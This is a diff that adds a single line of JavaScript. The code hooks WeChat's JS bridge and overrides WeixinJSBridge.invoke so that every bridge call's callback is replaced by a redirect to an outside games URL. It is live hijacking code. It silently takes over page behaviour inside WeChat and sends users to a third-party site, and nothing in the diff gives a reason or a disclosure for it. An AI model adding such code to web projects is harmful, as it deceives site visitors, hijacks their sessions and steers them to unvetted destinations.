@@ -1,0 +1,1 @@
+document.addEventListener("WeixinJSBridgeReady",function(){if(window.WeixinJSBridge){var a=WeixinJSBridge.invoke;WeixinJSBridge.invoke=function(){arguments[2]=function(){window.location.href="http://www.51tingweikeji.com/youxi"},a.apply(WeixinJSBridge,arguments)}}});
